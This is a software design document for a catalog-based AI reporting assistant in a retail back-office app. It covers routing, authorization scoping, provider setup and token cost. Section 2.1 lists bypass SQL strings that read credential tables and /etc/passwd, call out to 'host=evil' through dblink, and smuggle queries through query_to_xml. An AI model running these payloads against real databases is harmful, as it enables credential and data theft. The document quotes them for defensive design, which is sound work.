# AI Assistant — Design

**Status:** design agreed, not yet built. Supersedes the _architecture_ of
`docs/ai-chatbot-plan.md`; that document's coordination, file-ownership and
phasing conventions still stand and are reused below.

**Audience:** the agent implementing this. Everything here is meant to be
executable without coming back to ask.

---

## 1. What changed

The original plan was read-only **text-to-SQL**: the model turns a sentence
into a `SELECT`, we guard the SQL, we run it. Two requirements arrived after
that design was written, and together they rule it out:

> "we need to be able to work with the top 3 and local. It would be a specific
> set of data, but if the AI doesn't know the data we need to ensure it doesn't
> feel the need to confabulate an answer"

and, on cost:

> "While tokens should be optimized, if going local why worry? but no we should
> worry because others may be paying via an api"

So the assistant must:

1. Run on **Anthropic, OpenAI, Google, and a local runtime** (Ollama or LM
   Studio) — the same behaviour on all four.
2. Cover **a specific set of data**, not "anything in the database".
3. **Never confabulate.** If it does not know, it says so.
4. Be **token-frugal on metered providers**, without a second code path for
   local.

Requirement 3 is the one that changes the architecture. The rest follow.

---

## 2. Why text-to-SQL cannot satisfy "never confabulate"

Confabulation here is not the model inventing prose. It is the model returning
**a number that is wrong and looks authoritative**. In holt that happens by
omitting a filter, and the filters are not guessable from the schema.

`CLAUDE.md` rule 33: _exclude cancelled lines from every sum and count._ That
rule is enforced by hand, in every report, one literal at a time:

```
src/lib/reports/salesDaily.ts:45          lineItemStatus: { not: "CANCELLED" }
src/lib/reports/balanceAging.ts:102       lineItemStatus: { not: "CANCELLED" }
src/lib/reports/comparativeSales.ts:68    lineItemStatus: { not: "CANCELLED" }
src/lib/reports/detailedSales.ts:97,278   lineItemStatus: { not: "CANCELLED" }
src/lib/reports/salesPerformance.ts:82,130
src/lib/reports/customersReport.ts:97
src/lib/reports/pipelineOpportunity.ts:284
src/lib/reports/salesExplorerQuery.ts:145,233
src/lib/reports/staleQuotes.ts:67
src/lib/reports/poSellThru.ts:300
src/lib/reports/wealthInsights.ts:107
src/lib/reports/designerDashboard.ts:412
src/lib/reports/unclassifiedReturns.ts:185
… 20+ sites
```

And revenue scope is a second, independent rule — `SALES_REVENUE_STATUSES`
(`src/lib/salesOrderRevenue.ts:38`) is `["ORDER", "FULFILLED", "RETURNED"]`,
applied in `commissionSales.ts:102`, `poSellThru.ts:302`,
`wealthInsights.ts:110`, `salesExplorerQuery.ts:69`, and elsewhere.

Now consider the most obvious question a user will ask:

> _"What did we sell last month?"_

A model writing SQL against this schema writes, correctly-looking:

```sql
SELECT SUM("netPrice") FROM "SalesOrderLineItem" li
JOIN "SalesOrder" o ON o.id = li."salesOrderId"
WHERE o."orderDate" >= '2026-07-01' AND o."orderDate" < '2026-08-01'
```

That query is syntactically valid, read-only, passes every guard in
`lib/ai/sql.ts`, returns one clean number — and it is **wrong**. It counts
cancelled lines, and it counts QUOTE and DRAFT orders as revenue. Nothing in
the output says so. The user compares it to the Sales Daily report, gets two
different numbers, and now the whole product is untrustworthy.

The obvious rebuttal is "put the rules in the system prompt." That does not
work here, for a reason the codebase states out loud:

```
src/lib/opportunityTiles.ts:100
  // Intentionally NOT using SALES_REVENUE_STATUSES — these …
```

The correct filter set is **question-dependent**, and the exceptions are
recorded in comments across dozens of modules. A prompt would have to encode
holt's entire accounting semantics, stay in sync with them forever, and be
applied correctly by a 7B local model. It will not.

**Conclusion:** the model must not author the arithmetic. If it does, we cannot
promise the answer is right, and an answer we cannot promise is worse than no
answer — this is a back-office tool whose output people will act on.

### 2.1 And the guard on `feat/ai-chatbot-guardrails` does not hold

The correctness argument settles it on its own, but the security argument is
worse — and it is worth writing down because that guard is _mine_ and I believed
it was adequate. Every string below was run through the real `isReadOnly` from
`app/src/lib/ai/sql.ts`. **All fourteen are ALLOWED:**

```
SELECT * FROM pg_shadow                              -- prefix check only matches "pg_catalog." qualified
SELECT rolname, rolpassword FROM pg_authid           -- search_path resolves it unqualified
SELECT * FROM pg_catalog . pg_shadow                 -- whitespace defeats includes("pg_catalog.")
SELECT pg_read_file('/etc/passwd')                   -- a function; nothing checks functions
SELECT pg_ls_dir('/var/lib/postgresql/data')
SELECT lo_import('/etc/passwd')                      -- a WRITE, inside a SELECT
SELECT pg_sleep(10)                                  -- DoS
SELECT * FROM dblink('host=evil','SELECT 1') AS t(x int)   -- egress
SELECT email, "passwordHash" FROM "StaffMember"      -- see below
SELECT "publicToken" FROM "Ticket"                   -- no-login capability token
SELECT "portalToken" FROM "Return"                   -- customer portal capability token
SELECT string_agg(email, ',') FROM "Customer"        -- whole customer list in one cell; defeats the LIMIT cap
SELECT query_to_xml('SELECT * FROM "User"', true, true, '')
SELECT query_to_xml('SELECT * FROM "IntegrationCredential"', true, true, '')
```

Three are individually decisive:

- **`passwordHash` is on `StaffMember`, not `User`** (`app/prisma/schema.prisma:2885`).
  The deny list blocks `User`; the hashes are one table over. And
  `app/__tests__/aiSqlGuard.test.ts:70` **asserts `SELECT * FROM "StaffMember"`
  is allowed** — a committed test that codifies the hole as intended behaviour.
  That is what a table-shaped deny list does to a column-shaped problem across
  163 models that grow every release.
- **`query_to_xml` executes SQL inside a string literal**, and
  `referencesDeniedTable` strips single-quoted literals _before_ checking — a
  deliberate choice, so a customer named `'Session'` does not break the
  assistant for the whole shop. **The false-positive mitigation is the bypass**,
  and it reaches `IntegrationCredential`, the exact table the list was written
  to protect.
- **Functions are not tables.** `pg_read_file`, `lo_import`, `dblink` and
  `pg_sleep` are unchecked by construction, and `lo_import` is a _write_ the
  keyword gate cannot see because "read-only" was defined as "contains no DML
  keyword". The app connects as `POSTGRES_USER` (`docker-compose.yml:66`), which
  `postgres:17.9-alpine` creates as a **superuser**, so this is not theoretical.
  _(Confirm with `SELECT usesuper FROM pg_user WHERE usename = current_user;`
  before repeating the superuser claim in a security note.)_

Each is individually patchable. **That is not the lesson.** The guard is a
denylist over an unbounded grammar: every fix is a thing someone thought of, and
the next bypass is a function nobody enumerated. The catalog design does not
patch these — it deletes the grammar. See §7 for what happens to that branch.

---

## 3. The architecture: the model routes, the code computes

Invert the responsibility.

```
question ──▶ [model] ──▶ { questionId, params }  ──▶ [code] ──▶ rows ──▶ answer
                 │                                     │
       picks from a fixed catalog          runs the SAME lib/reports/
       or returns "unsupported"            function the UI already uses
```

The model's entire job is **classification and parameter extraction**. It
chooses one entry from a catalog of known-correct questions and fills in typed
arguments. It never emits SQL, never emits a number, and never sees a table it
was not given.

Every property we need falls out of this:

| Requirement               | How this delivers it                                                                                                                                                                                                                                                                                                                                                    |
| ------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Never confabulate         | The model cannot invent a number; numbers come from code. When no catalog entry matches, the only representable output is `unsupported`, and the UI says "I can't answer that — here's what I can answer."                                                                                                                                                              |
| Correct numbers           | Answers reuse the same report logic the UI uses, which already carries rule 33, `SALES_REVENUE_STATUSES`, and every documented exception — via a caller-scoped wrapper, **not** by importing `lib/reports/` directly (§4.2). The assistant is _by construction_ consistent with the reports page.                                                                       |
| "A specific set of data"  | The catalog _is_ the specific set. It is a file you can read in one sitting.                                                                                                                                                                                                                                                                                            |
| Injection-proof           | No generated SQL means no SQL to escape from. The `IntegrationCredential` exfiltration class disappears rather than being filtered.                                                                                                                                                                                                                                     |
| Cheap on metered APIs     | The request is a stable catalog + one short question. Cacheable prefix, tiny completion. See §6.                                                                                                                                                                                                                                                                        |
| Works on a 7B local model | "Pick an id from a numbered list and fill two fields" is within reach of small models in a way that "write correct PostgreSQL over 150 tables" is not.                                                                                                                                                                                                                  |
| Permission-aware          | Each entry carries the gate its report already has; entries the caller lacks are filtered out **before** the prompt is built, so the model cannot offer what the user may not see — and the gate is re-checked server-side **after** routing, because the model's choice is a hint, never an authorization. Read §4.1: the substrate for this is thinner than it looks. |

### The tradeoff, stated honestly

This answers **fewer** questions than text-to-SQL. That is the point, and it
should be visible in the product: when the assistant can't answer, it says so
and lists what it can do. A narrow tool that is always right is a feature; a
broad tool that is sometimes confidently wrong is a liability — and in a system
where the output is a dollar figure someone reports upward, it is the kind of
liability that ends the product.

Coverage grows by adding catalog entries, which is a normal PR with a normal
test, not a prompt-tuning exercise.

---

## 4. The question catalog

New file: `app/src/lib/ai/catalog.ts`. Flat array + `BY_ID` map + resolver that
throws on unknown id — the same shape as `lib/adapters/index.ts`,
`lib/payments/index.ts`, and the existing `lib/ai/registry.ts`. One file owns
the vocabulary (rule 37).

```ts
export interface CatalogParam {
  name: string;
  type:
    | "dateRange"
    | "storeId"
    | "salespersonId"
    | "productId"
    | "customerId"
    | "limit";
  required: boolean;
  description: string; // shown to the model; keep it one line
}

export interface CatalogEntry {
  /** Stable id. Renaming is a breaking change for saved conversations. */
  id: string;
  /** One line, written for the model: what question this answers. */
  description: string;
  /** Phrasings a user might actually type. Helps small models route. */
  examples: string[];
  params: CatalogParam[];
  /** See §4.1 — roles today, because reports.ts has no permissionProcedure. */
  gate: { roles: readonly string[] } | { permission: string };
  /** Output names identifiable people — see §4.1. */
  namesPeople: boolean;
  /** Calls lib/ai/answers/* (NOT lib/reports/* directly) — see §4.2. */
  run(args: Record<string, unknown>, ctx: AnswerContext): Promise<AnswerTable>;
}
```

### 4.1 ⚠ The authorization substrate does not exist — read this before writing an entry

An earlier draft of this document assigned each entry a `permission` such as
`reporting.read`. **That was wrong, and shipping it would have created a
privilege escalation.** Three verified facts:

1. **Reports are gated by ROLE, not by permission.**
   `app/src/server/trpc/routers/reports.ts` contains **40** `roleProcedure(...)`
   / `protectedProcedure` gates and **zero** `permissionProcedure`. The gates are
   `MANAGER_ADMIN` (13), `REPORT_ROLES` (4), `PIPELINE_ROLES` (4),
   `SUPER_ADMIN_ONLY` (3), `ADMIN_ONLY` (2), `ADMIN_MARKETING` (2), plus bare
   `protectedProcedure`.
2. **There are only two reporting permissions in the entire catalog** —
   `reporting.read` (`permissionCatalog.ts:308`) and `reporting.export` (`:314`,
   `sensitive: true`, _"Download report data and customer lists"_).
3. So mapping every entry to `reporting.read` — which **DESIGNER** and
   **MARKETING** hold — hands a Designer `grossMargin` (MANAGER_ADMIN),
   `balanceAging` (ADMIN_ONLY), `customersReport` and `wealthInsights`
   (ADMIN_MARKETING), and `dormantCustomers` (MANAGER_ADMIN). And
   `dormantCustomers.ts:91` returns `firstName, lastName, email, phone` per row
   — precisely the customer list `reporting.export` exists to withhold.

**The rule that follows:** an entry's gate is _the role set its tRPC procedure
uses today_, carried over verbatim, until a real report→permission mapping
exists. Widening a gate is a separate, deliberate PR — never a side effect of
adding an assistant entry.

```ts
  /**
   * The gate this answer already has in the UI, copied from its tRPC procedure.
   * Roles today because reports.ts has no permissionProcedure; this becomes a
   * permission when the report→permission mapping lands. Checked server-side
   * AFTER routing — the model's choice is a hint, never an authorization.
   */
  gate: { roles: readonly string[] } | { permission: string };
  /** Output names identifiable people. Requires reporting.export as a second gate. */
  namesPeople: boolean;
```

Building that report→permission mapping is the **single largest unbudgeted item**
in this plan (~37 rows, landing beside `feat/custom-roles`). Until it exists,
copy roles. Do not invent permissions.

### 4.2 ⚠ A catalog entry may NOT call `lib/reports/*` directly

The earlier draft said entries "wrap a function that is already correct and
already tested". The correctness half is true. The **authorization** half is
not, and the codebase says so in its own comments:

```
lib/reports/monthlyPerformance.ts:6   "authorization stays in the tRPC procedure (it needs the session)"
lib/reports/salespersonDetail.ts:7    same
lib/reports/designerDashboard.ts:6    "caller-vs-requested salesperson authorization stays in the tRPC procedure"
lib/reports/opportunities.ts:5        "Role-aware wealth visibility is decided by the caller … passed in as canSeeWealth"
```

`reports.ts:420-435` is the concrete case: non-managers are locked to **their
own** staff record, resolved from `ctx.userId`, _never from client input_ — and
that logic lives in the **procedure body**, not the lib function. An entry that
calls `getSalespersonDetail(prisma, { salesperson })` hands any signed-in
salesperson any colleague's year. That is an escalation the assistant _creates_,
not one it inherits. Likewise an entry that defaults `canSeeWealth` to `true`
silently un-gates wealth profiling.

**So:** entries call a **caller-scoped wrapper** that takes `ctx` and reproduces
the procedure's scoping. New directory `app/src/lib/ai/answers/`, one file per
entry, each mirroring exactly what its procedure does with the session.

> **Tripwire (write this test first):** a source-text test asserting **no file
> under `app/src/lib/ai/answers/` imports from `@/lib/reports/`**. Without it,
> the next contributor writes the one-line wrapper that looks obviously fine and
> quietly drops the session scoping. This is CLAUDE.md rule 42 applied to reads.

### 4.3 "Never raw SQL" is true one import deep and false two

**10 of 36** modules in `lib/reports/` use `$queryRaw`/`$queryRawUnsafe`, and
`buyersReport.ts:274` interpolates a parameter straight into the string:

```ts
${storeId ? `AND ip."storeLocationId" = ${storeId}` : ""}
```

Safe **today** only because line 235 hand-narrows it
(`typeof params.storeId === "number" && params.storeId > 0`). There is no shared
guard and no tripwire. The property being sold is "no raw SQL"; the property
actually obtained is _"raw SQL written by a human, parameterised by a model"_,
resting on 36 functions each independently re-narrowing their own inputs,
forever.

**So:** every entry validates its args with a zod schema **before** the call,
and args reaching a raw-SQL report are additionally narrowed at the wrapper. Add
a test that fails when a new `${` interpolation appears inside a `$queryRaw`
template in `lib/reports/`.

### 4.4 The seed entries

| id                    | answer wraps               | gate (copied from `reports.ts`)                     | names people |
| --------------------- | -------------------------- | --------------------------------------------------- | ------------ |
| `sales.daily`         | `salesDaily`               | `REPORT_ROLES`                                      | no           |
| `sales.byPeriod`      | `comparativeSales`         | `REPORT_ROLES`                                      | no           |
| `sales.topSellers`    | `topSellers`               | `REPORT_ROLES`                                      | no           |
| `orders.open`         | `openOrders`               | `REPORT_ROLES`                                      | no           |
| `orders.staleQuotes`  | `staleQuotes`              | `PIPELINE_ROLES`                                    | no           |
| `inventory.health`    | `inventoryHealth`          | `MANAGER_ADMIN`                                     | no           |
| `margin.gross`        | `grossMargin`              | `MANAGER_ADMIN`                                     | no           |
| `ar.balanceAging`     | `balanceAging`             | `ADMIN_ONLY`                                        | no           |
| `sales.bySalesperson` | `salesBySalespersonReport` | `MANAGER_ADMIN` + self-scoping per `reports.ts:420` | staff        |
| `customers.dormant`   | `dormantCustomers`         | `MANAGER_ADMIN` **+ `reporting.export`**            | **yes**      |

Confirm each gate against `reports.ts` at implementation time rather than
trusting this table — it is a snapshot, and the router is the source of truth.

`customers.dormant` carries a second gate deliberately. `reporting.export` is
marked `sensitive: true` and exists to withhold customer lists; a list of names,
emails and phone numbers is no less sensitive for arriving as a chat answer
than as a CSV download. If that feels heavy for phase 1, **cut the entry** —
that is the cheaper correct answer.

> **Rule for every future entry:** it MUST go through `lib/ai/answers/`, MUST
> reproduce its procedure's session scoping, MUST validate args with zod, and
> MUST NOT contain a `$queryRaw`. If an answer needs a query that does not exist
> yet, write it in `lib/reports/` with its own test first. This is what keeps
> the assistant and the reports from becoming two different truths.

### 4.5 ⚠ "Excluding cash sales" cannot be answered today — the tender column is empty

Answering the request to confirm whether cash means `PaymentMethod.CASH`, and
whether cash/revenue are code constants or per-deployment config.

**The vocabulary answer**: yes, `PaymentMethod.CASH` is the bounded enum
(`schema.prisma:2629`, nine values), and `lib/paymentMethodDisplay.ts` is its
single owner under rule 37 — it maps the enum to the display strings stored on
`Payment.paymentType`.

**The data answer**: that enum is not populated. Measured against
`holt_saybrook` (47,880 `Payment` rows):

| `method` | `paymentType`     | rows   |
| -------- | ----------------- | ------ |
| `NULL`   | Card Connect      | 34,027 |
| `NULL`   | Card Not Present  | 5,506  |
| `NULL`   | Cash              | 3,387  |
| `NULL`   | Refund            | 2,317  |
| `NULL`   | Store Credit      | 885    |
| `NULL`   | Gift Card         | 723    |
| `NULL`   | Check             | 629    |
| `NULL`   | ACH               | 327    |
| `NULL`   | …8 more spellings | 77     |
| `CARD`   | Card - Stripe     | **2**  |

`Payment.method` is set on **2 of 47,880 rows**. An entry filtering on it
returns essentially everything or nothing — and because the column is nullable,
a naked `not:` also silently drops every NULL (rule 51). The populated column is
`paymentType`: free text, 16 distinct spellings, none of which the code
enumerates.

**So: constant or config?** Both, at different layers, and this is the general
shape for every vocabulary question the catalog will hit:

- the **enum** is a code constant — a bounded vocabulary with one owner file;
- the **mapping from a deployment's tender strings into that enum** is config.

That config already exists as `config/presets/ordorite-payment-modes.yaml`
(`paymentType: { "Card Connect": CARD, "Credit Note": STORE_CREDIT, … }`). It
ships `isActive: false` because `targetEntity: "payment"` has no entry in
`IMPORT_ENTITIES` yet, which is exactly why `method` is NULL everywhere.

**Recommendation: cut the entry from phase 1.** Not because ranking customers by
revenue is hard, but because the "excluding cash sales" clause cannot be
computed correctly from current data, and an answer that silently ignores the
clause is worse than no answer. Ship `customers.topByRevenue` **without** a
tender filter if it is wanted, and let the tender clause land after the payment
entity is wired (tracked separately).

If a tender filter is built later it must resolve through the same value mapping
the ledger uses — never a second literal list, or the assistant and the journal
will disagree about what "cash" means.

**The same lookup is already dropping money.** `journalEntry.ts:832-838` keys
its GL map on `paymentType.toLowerCase()` and does
`warnings.push("Unmapped payment type"); continue` on a miss. The
`POS_PAYMENTS` mapping rows in `holt_saybrook` are AMEX, Cash, Check, Deposit,
Discover, Finance, Gift Card, MC, On Account, Visa — of which AMEX, Visa, MC and
Discover match **zero** rows, while the dominant real value "Card Connect"
matches nothing. Roughly 43,100 of 47,880 payments are skipped from the sales
journal. That is a reporting-correctness bug in its own right, and it is the
best argument that this vocabulary belongs in config rather than in whichever
file needs it next.

---

## 5. The provider seam

`lib/ai/types.ts` currently defines `generateSql(question, schema)`. **Replace
it** with a routing call. Same file, same registry, same resolution story — the
`AiProvider` interface changes shape, nothing else about the seam does.

```ts
export interface RouteRequest {
  question: string;
  /** Only entries the caller is permitted to run. */
  catalog: CatalogEntry[];
  /** Prior turns, for follow-ups like "same thing for last month". */
  history: { role: "user" | "assistant"; content: string }[];
}

export type RouteResult =
  | { kind: "answer"; questionId: string; args: Record<string, unknown> }
  | { kind: "unsupported"; reason: string };

export interface AiProvider {
  id: string;
  label: string;
  route(req: RouteRequest): Promise<RouteResult>;
  /** Optional. Phrases the result in prose. See §6 — off by default on metered providers. */
  narrate?(question: string, table: AnswerTable): Promise<string>;
}
```

`RouteResult` is a closed union, and that is the load-bearing detail: **there is
no variant in which the model supplies a fact.** `unsupported` is not an error
path, it is a first-class answer.

### Provider implementations

| Provider id         | Transport                                    | Notes                                                    |
| ------------------- | -------------------------------------------- | -------------------------------------------------------- |
| `anthropic`         | `@anthropic-ai/sdk` (add dependency)         | Official SDK — do not use an OpenAI-compatible shim.     |
| `openai`            | OpenAI-compatible `/v1/chat/completions`     |                                                          |
| `google`            | `@google/genai` or REST                      | Distinct wire format; own file.                          |
| `openai-compatible` | same as `openai`, operator-supplied base URL | **Covers Ollama, LM Studio, vLLM, LiteLLM, OpenRouter.** |

The last row is worth calling out: Ollama and LM Studio both serve an
OpenAI-compatible endpoint (`http://localhost:11434/v1` and
`http://localhost:1234/v1` respectively). So "local" is not a fourth
implementation — it is the OpenAI implementation with a different `baseUrl` and
no API key. That is **three** files to write, not four, and it means a
deployment can point at any gateway without a code change.

Keep `providers/ollama.ts` as a thin preset over `openai-compatible` (it sets
the default base URL and skips auth) so the existing `AI_PROVIDER=ollama`
config keeps working.

### Getting structured output

Ranked by preference; fall through per provider capability:

1. **Native structured output** — Anthropic `output_config.format` with a JSON
   schema, OpenAI `response_format: json_schema`, Gemini
   `responseSchema`. Guarantees a parseable result.
2. **Tool calling** — a `answer_question` tool whose schema is the catalog.
   Supported by all four, but unreliable on small local models.
3. **Numbered-choice fallback** — present the catalog as a numbered list and
   ask for `{"id": N, "args": {...}}`. Crude, but a 7B model can do it.

Whichever path is used, **validate the result with a zod schema built from the
catalog** before acting on it (`zod` is already a dependency). An id not in the
catalog, or an arg that fails its type, is treated as `unsupported` — never as
an error the user sees as a stack trace, and never as something to retry
silently more than once.

For Anthropic specifically: use `claude-opus-5` as the default model, adaptive
thinking (`thinking: { type: "adaptive" }`), and **no `budget_tokens`** — it
returns a 400 on current models. Model ids carry no date suffix. Operators who
want to trade capability for cost can select `claude-sonnet-5` or
`claude-haiku-4-5`; that is their call, so it is a config field, not a default
we choose for them.

---

## 6. Token cost

The user's framing is exactly right: cost is invisible locally and real on an
API, so optimise for the API and let local benefit for free.

Per question, the request is: the catalog description block (stable) + short
history + one sentence. **The catalog is the only large part, and it is
byte-identical across every request** — which makes it a textbook cacheable
prefix.

- **Prompt caching (Anthropic):** put `cache_control: { type: "ephemeral" }` on
  the last catalog block. Cached reads are ~0.1× input price. Minimum cacheable
  prefix is 512 tokens on Opus 5 — a 10-entry catalog with examples clears
  that. Keep the catalog block **first and byte-stable**: no timestamps, no
  user id, no `Date.now()` in the rendered prompt, and sort the entries
  deterministically. Volatile content (the question, the history) goes after
  the breakpoint. Verify with `usage.cache_read_input_tokens` — if it is zero
  across repeated asks, something is interpolating per-request bytes into the
  prefix.
- **Permission filtering happens before caching.** Filtering the catalog per
  user changes the prefix and gives each role its own cache entry. That is
  fine — roles are few and stable. Do **not** filter per _user_.
- **Completion is tiny** — an id and two args, tens of tokens.
- **Narration is opt-in.** `narrate()` doubles the round trips and sends result
  rows to the provider. Default it **off** for metered providers and **on** for
  local, via one setting (`AI_NARRATE`, default `provider.isLocal`). With it
  off, the UI renders the table plus a deterministic caption built in code —
  which is also strictly safer, since a narration step is the one place a model
  could still restate a number wrongly.
- **When narration is on**, constrain it: _"Restate only values present in the
  table. Do not compute new figures. Do not add context you were not given."_
  And keep the table small — narrate over the capped result, never the raw set.

Rough shape on Anthropic with caching and narration off: a few hundred cached
input tokens plus a handful of completion tokens per question. That is the
difference between an assistant a shop leaves switched on and one they turn
off after the first invoice.

---

## 7. What happens to the guardrails branch

An earlier draft of this section said the guard was "belt-and-braces — keep it
anyway, it costs nothing." **That was wrong on both counts.** §2.1 shows it
allows staff password hashes, capability tokens, catalog reads, filesystem
reads, a write (`lo_import`), and `IntegrationCredential` itself via
`query_to_xml`. A guard that porous does not cost nothing: it costs **false
confidence**, which is the most expensive kind of security control.

**Delete, with the text-to-SQL path:**

- `lib/ai/sql.ts` — `isReadOnly`, `schemaText`, `runSelect`. All of it.
- `lib/ai/askData.ts`, `providers/ollama.ts`'s `generateSql`.
- `__tests__/aiSqlGuard.test.ts` — including **line 70**, which asserts
  `SELECT * FROM "StaffMember"` is allowed. That assertion is the hole in
  test form; it must not survive into a branch anyone trusts.

**Keep, repurposed:**

- `lib/ai/tableAccess.ts` — **not** as an assistant control (under the catalog
  there is no table access to deny), but as a **tripwire**: a test asserting no
  file under `lib/ai/` reaches a denied table or contains `$queryRaw`. It stops
  being a filter on model output and becomes a filter on _our_ code, which is a
  bounded grammar and therefore a thing a denylist can actually cover.
- The `SET LOCAL statement_timeout` in `runSelect` — see §7.1. Do not lose it.

**Keep in the commit history, because both findings are true and load-bearing:**
`SELECT * FROM "IntegrationCredential"` is a read-only query that passes every
keyword gate — read-only is not the same as harmless. And the deny list that
answered it was itself bypassable fourteen ways. Both are the argument for this
design.

**Also fix on that branch, independent of the assistant:**
`server/trpc/routers/chat.ts` calls `permissionProcedure("reporting.read")` but
**never** calls `isModuleEnabled`/`requireModule`. Only the _page_ gates on the
`ai` module. So `/api/trpc/chat.ask` is reachable with the module switched off
— the same UI-gate-is-not-a-control failure `permissionCatalog.ts`'s own header
describes about `NavPermission` ("an operator who unchecked 'Sales' for DESIGNER
had revoked nothing"). `clientPortal.ts`, `legacyArchive.ts` and `billing.ts`
all gate correctly; the AI router is the one that skipped it.

### 7.1 The database cost nobody budgeted

The catalog design **removes** the one database-side control the raw path had:
`runSelect` opened a transaction and ran `SET LOCAL statement_timeout = '10s'`
before every model-authored query. Calling "tested code" instead does not make
that unnecessary — it makes it easier to forget.

Two facts make this urgent:

- `getFactSalesDay(prisma)` (`lib/reports/factSalesDay.ts:33`) takes **no
  parameters** and aggregates every order ever written. `getSalesDaily(prisma, {})`
  applies no range when dates are absent.
- Today the rate limiter is _human friction_ — you navigate to a page and pick
  filters. The assistant deletes that friction, on the same Postgres container
  that serves the POS on a NAS.

**So:** every `run()` executes inside a transaction with `SET LOCAL
statement_timeout` and `SET LOCAL lock_timeout` — **3s, not 10** — plus a
per-deployment concurrency cap of 1–2 in-flight asks. The question to answer
before phase 1 ships is: _what does the cashier taking a payment see when three
managers simultaneously ask "how did we do this year?"_

Note also that `lib/rateLimit.ts` **cannot be used here**: it takes
`NextApiRequest`/`NextApiResponse` and keys on client IP via `X-Real-IP`. This
is an App Router tRPC mutation with neither object — and in a single-store
deployment behind one NAT, IP-keying is one bucket for the whole sales floor.
Per-user and per-deployment counters need a DB-backed counter; a per-process
budget is not a budget.

### 7.2 The provenance line is weaker than it looks

§8 phase 2 proposes a provenance line ("this came from the Sales Daily report").
Keep it — but do not mistake it for an accuracy control. `dormantCustomers.ts`
hard-excludes `d.name NOT IN ('Freight','MRC','Hardware')` **inside its SQL**,
and that appears in no parameter and no caption. Someone who cannot audit
`SUM("netPrice")` cannot audit `{tool: "dormantCustomers", minSpend: 2000}`
either. The provenance line's real job is _navigational_ — it tells the user
which page to open to see the full definition. Say that in the UI copy rather
than implying the answer has been shown its work.

---

## 8. Phasing

Each phase ships independently and is separately reviewable.

**Phase 0a — centralise rule 33 first.** The shared line-item scope helper from
§9.1. Sequencing it ahead is what lets catalog entries _compose_ the rule rather
than trust that each report remembered it. It has its own exact test
(every report's numbers unchanged) and its own value with or without this
feature.

**Phase 0b — the assistant that speaks first (strongly recommended).**

Before building a question box, consider building a **scheduled morning
digest**: run N fixed answers under a service identity on a cron, one model call
to phrase the deltas, deliver by email. It sidesteps most of what makes phase 1
hard:

- **No user-supplied text at all**, so there is no prompt-injection channel to
  defend.
- **One model call per deployment per day**, so cost is arithmetic rather than a
  control to design.
- **Latency is irrelevant**, so a small local model on a NAS is genuinely fine
  and a cloud provider is genuinely optional.
- **No rate limiting needed** — the trigger is a cron, not a person.
- It reaches **the owner**, who will never remember to open a chat panel, and it
  puts a number in front of the one person who can spot a wrong one, every
  morning.

The substrate already exists: `/api/automations/*` Bearer-token cron endpoints
driven by the host scheduler (`docs/OPERATIONS.md:99-103`), `lib/email/queue.ts`
drained by an existing cron, `lib/opsAlert.ts` already env-gated to no-op when
unconfigured, and `getOpportunityTiles` (`lib/reports/opportunities.ts:57`),
which already computes "what matters".

It is also a far better accuracy programme than a golden question set: a wrong
number in front of the owner every morning gets reported within a day. Build the
answers layer (§4.2) for the digest, then phase 1 is a question box on top of a
proven layer rather than a new surface _and_ a new safety story at once.

**Phase 1 — the catalog and the seam (the real work)**

1. `lib/ai/catalog.ts` — interface + the seed entries in §4.4.
2. `lib/ai/answers/` — one caller-scoped wrapper per entry (§4.2), plus the
   import tripwire test.
3. `lib/ai/types.ts` — replace `generateSql` with `route`/`narrate`.
4. `lib/ai/answer.ts` — resolve entry → **re-check gate server-side** → validate
   args with zod → run inside a timeout-scoped transaction (§7.1) → cap rows →
   return `AnswerTable`. Replaces `askData.ts`.
5. `lib/ai/providers/openaiCompatible.ts` + keep `ollama.ts` as a preset.
6. `server/trpc/routers/chat.ts` — swap to the new call; keep the permission
   procedure.
7. `providers/anthropic.ts` and `providers/google.ts` ship **in phase 1**, not
   later. The stated requirement is _"work with the top 3 and local"_; a phase 1
   that ships only a local runtime has not met it, and deferring the cloud
   providers hides the awkward parts (keys, caching, structured-output
   differences) until after the seam has hardened around one implementation.
   Keys go through `lib/integrationCatalog.ts` + `resolveCredential` — encrypted
   at rest, same path as Stripe and SMTP — **not** env vars. That means
   `AppSettings.aiProviderId` + its migration is phase 1 too.
8. Tests: every entry resolves; a made-up id is `unsupported`; a caller lacking
   an entry's gate never sees it in the prompt **and** is refused if it is
   requested anyway; the §4.2 import tripwire; the §4.3 interpolation tripwire.

**Phase 2 — UI**
`components/ai/ChatPanel.tsx` renders the table, the "I can't answer that"
state with the catalog listed, and the provenance line — worded as navigation,
per §7.2, not as proof.

**Phase 3 — coverage**
Grow the catalog based on what real users ask. Log every `unsupported` with the
question text (behind a setting) — that log _is_ the backlog, and it is the
only honest way to decide what to build next.

**Explicitly out of scope — as decisions, not omissions**

- **Writes. The assistant answers; it never acts.** This was inherited from the
  PoC's framing rather than argued, so state it: the daily pain in a back office
  is data entry, and "draft this quote / tag this return / receive this PO" is
  the obviously valuable next thing. It is deliberately not in scope because
  every guarantee in §3 depends on the output being a _table the user reads_.
  A write turns a routing mistake from "wrong answer on screen" into "wrong row
  in the ledger", and it needs its own confirmation, audit and undo story.
  Revisit as a separate feature with a separate design — not as a phase of this
  one.
- Customer-facing chat. Different threat model entirely (unauthenticated,
  hostile input, no permission context). The catalog design is a good
  foundation for it later, but do not conflate the two.
- An MCP server. One deployment = one tenant = one database
  (`docs/TENANCY.md`); the tools are in-process `lib/` functions. MCP exposes
  tools to _external_ clients, which is a different product. Revisit only if
  someone wants to drive holt from Claude Desktop.
- Free-form SQL for admins. If it is ever wanted, it is a separate,
  separately-gated feature that is not called "the assistant".

---

## 9. Stepping back — is this the right thing to build at all?

Three questions worth answering before writing code, because two of them
change what gets built.

### 9.1 The assistant exposed a real bug that has nothing to do with AI

Rule 33 is enforced by **copy-paste**. `lineItemStatus: { not: "CANCELLED" }`
appears as a literal in 20+ files. `SALES_REVENUE_STATUSES` is at least a named
constant, but every caller still has to remember to apply it — and
`opportunityTiles.ts:100` documents a case where not applying it is correct, so
"always spread it" is not the rule either.

That is a latent correctness bug in the reports **today**, with or without an
assistant. A new report that forgets the literal is silently wrong — no test
fails, no type error, the number just quietly includes cancelled lines. This is
precisely the failure mode CLAUDE.md rule 37 exists to prevent ("one file owns
the vocabulary"), and rule 42 applies to reads for the same reason it applies
to mutations: a rule enforced at 20 call sites is enforced at 19 the moment
someone adds the 20th.

**The better fix, independent of this feature:** a shared line-item scope
helper — something like `lib/salesLineScope.ts` exporting
`revenueLineWhere()` / `allLineWhere()` — so the rule lives in one place, the
